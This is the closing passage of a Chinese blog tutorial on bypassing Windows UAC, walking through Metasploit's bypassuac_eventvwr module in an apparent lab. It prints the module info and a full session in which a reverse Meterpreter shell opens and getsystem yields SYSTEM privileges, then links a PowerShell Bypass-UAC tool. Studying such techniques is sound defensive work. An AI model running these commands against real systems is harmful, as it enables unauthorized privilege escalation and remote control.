+<p>7、可以看到很多，这里，我只使用第三个进行测试。</p>
+<p>​    exploit/windows/local/bypassuac_eventvwr</p>
+<p>8、我们看一下该模块的信息：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/local/bypassuac_eventvwr) &gt; info</span><br><span class="line"></span><br><span class="line"><span class="function">       Name: <span class="title">Windows</span> <span class="title">Escalate</span> <span class="title">UAC</span> <span class="title">Protection</span> <span class="title">Bypass</span> (<span class="title">Via</span> <span class="title">Eventvwr</span> <span class="title">Registry</span> <span class="title">Key</span>)</span></span><br><span class="line"><span class="function">     <span class="title">Module</span>: <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">bypassuac_eventvwr</span></span></span><br><span class="line"><span class="function">   <span class="title">Platform</span>: <span class="title">Windows</span></span></span><br><span class="line"><span class="function">       <span class="title">Arch</span>: </span></span><br><span class="line"><span class="function"> <span class="title">Privileged</span>: <span class="title">No</span></span></span><br><span class="line"><span class="function">    <span class="title">License</span>: <span class="title">Metasploit</span> <span class="title">Framework</span> <span class="title">License</span> (<span class="title">BSD</span>)</span></span><br><span class="line"><span class="function">       <span class="title">Rank</span>: <span class="title">Excellent</span></span></span><br><span class="line"><span class="function">  <span class="title">Disclosed</span>: 2016-08-15</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Provided</span> <span class="title">by</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Matt</span> <span class="title">Nelson</span></span></span><br><span class="line"><span class="function">  <span class="title">Matt</span> <span class="title">Graeber</span></span></span><br><span class="line"><span class="function">  <span class="title">OJ</span> <span class="title">Reeves</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Available</span> <span class="title">targets</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Id</span>  <span class="title">Name</span></span></span><br><span class="line"><span class="function">  --  ----</span></span><br><span class="line"><span class="function">  0   <span class="title">Windows</span> <span class="title">x86</span></span></span><br><span class="line"><span class="function">  1   <span class="title">Windows</span> <span class="title">x64</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Check</span> <span class="title">supported</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Yes</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Basic</span> <span class="title">options</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Name</span>     <span class="title">Current</span> <span class="title">Setting</span>  <span class="title">Required</span>  <span class="title">Description</span></span></span><br><span class="line"><span class="function">  ----     ---------------  --------  -----------</span></span><br><span class="line"><span class="function">  <span class="title">SESSION</span>                   <span class="title">yes</span>       <span class="title">The</span> <span class="title">session</span> <span class="title">to</span> <span class="title">run</span> <span class="title">this</span> <span class="title">module</span> <span class="title">on</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Payload</span> <span class="title">information</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Description</span>:</span></span><br><span class="line"><span class="function">  <span class="title">This</span> <span class="title">module</span> <span class="title">will</span> <span class="title">bypass</span> <span class="title">Windows</span> <span class="title">UAC</span> <span class="title">by</span> <span class="title">hijacking</span> <span class="title">a</span> <span class="title">special</span> <span class="title">key</span> <span class="title">in</span> </span></span><br><span class="line"><span class="function">  <span class="title">the</span> <span class="title">Registry</span> <span class="title">under</span> <span class="title">the</span> <span class="title">current</span> <span class="title">user</span> <span class="title">hive</span>, <span class="title">and</span> <span class="title">inserting</span> <span class="title">a</span> <span class="title">custom</span> </span></span><br><span class="line"><span class="function">  <span class="title">command</span> <span class="title">that</span> <span class="title">will</span> <span class="title">get</span> <span class="title">invoked</span> <span class="title">when</span> <span class="title">the</span> <span class="title">Windows</span> <span class="title">Event</span> <span class="title">Viewer</span> <span class="title">is</span> </span></span><br><span class="line"><span class="function">  <span class="title">launched</span>. <span class="title">It</span> <span class="title">will</span> <span class="title">spawn</span> <span class="title">a</span> <span class="title">second</span> <span class="title">shell</span> <span class="title">that</span> <span class="title">has</span> <span class="title">the</span> <span class="title">UAC</span> <span class="title">flag</span> <span class="title">turned</span> </span></span><br><span class="line"><span class="function">  <span class="title">off</span>. <span class="title">This</span> <span class="title">module</span> <span class="title">modifies</span> <span class="title">a</span> <span class="title">registry</span> <span class="title">key</span>, <span class="title">but</span> <span class="title">cleans</span> <span class="title">up</span> <span class="title">the</span> <span class="title">key</span> <span class="title">once</span> </span></span><br><span class="line"><span class="function">  <span class="title">the</span> <span class="title">payload</span> <span class="title">has</span> <span class="title">been</span> <span class="title">invoked</span>. <span class="title">The</span> <span class="title">module</span> <span class="title">does</span> <span class="title">not</span> <span class="title">require</span> <span class="title">the</span> </span></span><br><span class="line"><span class="function">  <span class="title">architecture</span> <span class="title">of</span> <span class="title">the</span> <span class="title">payload</span> <span class="title">to</span> <span class="title">match</span> <span class="title">the</span> <span class="title">OS</span>. <span class="title">If</span> <span class="title">specifying</span> </span></span><br><span class="line"><span class="function">  <span class="title">EXE</span>::<span class="title">Custom</span> <span class="title">your</span> <span class="title">DLL</span> <span class="title">should</span> <span class="title">call</span> <span class="title">ExitProcess</span>() <span class="title">after</span> <span class="title">starting</span> <span class="title">your</span> </span></span><br><span class="line"><span class="function">  <span class="title">payload</span> <span class="title">in</span> <span class="title">a</span> <span class="title">separate</span> <span class="title">process</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">该模块通过在当前用户配置单元下劫持注册表中的特殊键，并插入将在启动<span class="title">Windows</span> <span class="title">fodhelper.exe</span>应用程序时调用的自定义命令来绕过<span class="title">Windows</span> 10 <span class="title">UAC</span>。它将为我们生成另一个关闭<span class="title">UAC</span>的<span class="title">shell</span>。虽然该模块修改了注册表，但它会在调用<span class="title">payload</span>后清除该键。相比之前的模块，该模块对架构系统并无特别要求。如果指定<span class="title">EXE</span>::<span class="title">Custom</span> <span class="title">DLL</span>，则应在单独的进程中启动<span class="title">payload</span>后调用<span class="title">ExitProcess</span>()。</span></span><br></pre></td></tr></table></figure>
+<p>9、简单的了解，就开始尝试提权绕过吧。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">msf5 exploit(windows/local/bypassuac_eventvwr) &gt; <span class="built_in">set</span> session <span class="number">4</span></span><br><span class="line">session =&gt; <span class="number">4</span></span><br><span class="line">msf5 exploit(windows/local/bypassuac_eventvwr) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">8</span>:<span class="number">4444</span> </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[+] UAC is <span class="built_in">set</span> to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[*] Configuring payload and stager registry keys ...</span><br><span class="line">[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe</span><br><span class="line">[+] eventvwr.exe executed successfully, waiting <span class="number">10</span> seconds <span class="keyword">for</span> the payload to execute.</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">106</span></span><br><span class="line">[*] Meterpreter session <span class="number">6</span> opened (<span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">8</span>:<span class="number">4444</span> -&gt; <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">106</span>:<span class="number">49167</span>) <span class="built_in">at</span> <span class="number">2019</span>-<span class="number">07</span>-<span class="number">10</span> <span class="number">04</span>:<span class="number">32</span>:<span class="number">42</span> -<span class="number">0400</span></span><br><span class="line">[*] Cleaning up registry keys ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique <span class="number">1</span> (Named Pipe Impersonation (<span class="keyword">In</span> Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\12.png" alt></p>
+<p>10、可以看出来，绕过成功。</p>
+<p>11、至于为啥不用其它的了，因为在该测试环境下失败了（可能是配置的问题吧）。。。。</p>
+<p><strong>0x11 其它工具</strong></p>
+<p>工具名：Bypass-UAC</p>
+<p>介绍：Bypass-UAC是一个独立的框架，它不需要依赖其他任何的环境。但是请注意，使用该框架时唯一的要求就是目标主机必须安装有PowerShell v2。</p>
+<p>下载地址：<a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC</a></p>
+<p>相关文章：<a href="https://www.anquanke.com/post/id/84582" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84582</a></p>
+<p><strong>0x12 参考文章</strong></p>
+<p>[1] <a href="https://04z.net/archives/d597cbf9.html" target="_blank" rel="noopener">https://04z.net/archives/d597cbf9.html</a><br>[2] <a href="https://www.freebuf.com/articles/system/185311.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/185311.html</a><br>[3] <a href="https://www.anquanke.com/post/id/84582" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84582</a><br>[4] <a href="https://www.4hou.com/technology/4583.html" target="_blank" rel="noopener">https://www.4hou.com/technology/4583.html</a><br>[5] <a href="https://blog.csdn.net/qq_27446553/article/details/52610365" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/52610365</a><br>[6] <a href="https://docs.microsoft.com/zh-cn/windows-server/security/user-account-control/how-user-account-control-works" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-server/security/user-account-control/how-user-account-control-works</a><br>[7] <a href="https://payloads.online/archivers/2018-12-22/1#0x11-uac%E7%AE%80%E4%BB%8B" target="_blank" rel="noopener">https://payloads.online/archivers/2018-12-22/1#0x11-uac%E7%AE%80%E4%BB%8B</a></p>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2019/07/11/UAC-and-ByPass-UAC/" data-id="cl64hepgh004jasw10xfpqqg7" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ByPass-UAC/">ByPass-UAC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UAC/">UAC</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
